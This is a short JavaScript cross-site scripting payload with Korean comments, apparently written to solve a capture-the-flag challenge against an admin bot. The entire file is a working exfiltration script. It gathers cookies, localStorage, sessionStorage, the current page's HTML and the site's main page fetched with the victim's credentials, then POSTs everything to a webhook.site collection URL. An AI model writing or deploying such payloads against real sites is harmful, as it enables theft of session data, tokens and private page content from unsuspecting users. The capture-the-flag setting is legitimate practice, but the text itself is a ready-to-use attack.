(async () => {

    // 2. 다양한 저장소 확인 (Cookie 외)
    const storageData = {
        local: JSON.stringify(window.localStorage),
        session: JSON.stringify(window.sessionStorage)
    };

    // 3. [핵심] 봇의 권한으로 메인 페이지('/') 소스 코드 긁어오기
    // 만약 HttpOnly 쿠키로 인증된 상태라면, fetch 요청 시 쿠키가 자동으로 포함됩니다.
    // index.html에 플래그가 렌더링 되어 있을 수 있습니다.
    let indexPageContent = "";
    try {
        const response = await fetch('/', { method: 'GET' });
        indexPageContent = await response.text();
    } catch (e) {
        indexPageContent = "Fetch Failed: " + e.toString();
    }

    // 4. 현재 페이지의 전체 HTML (혹시 봇이 보는 화면에 주석 등으로 플래그가 있는지)
    const currentHTML = document.documentElement.outerHTML;

    // 5. 데이터 전송
    let data = {
        msg: "Exfiltration Data",
        cookie: document.cookie, // HttpOnly면 비어있음
        localStorage: storageData.local, // 혹시 여기에?
        sessionStorage: storageData.session,
        location: window.location.href,
        indexPage: indexPageContent, // 메인 페이지 소스 (가장 유력)
        currentHTML: currentHTML // 현재 페이지 소스
    };

    fetch('https://webhook.site/YOUR_WEBHOOK_URL', {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify(data)
    });
})();
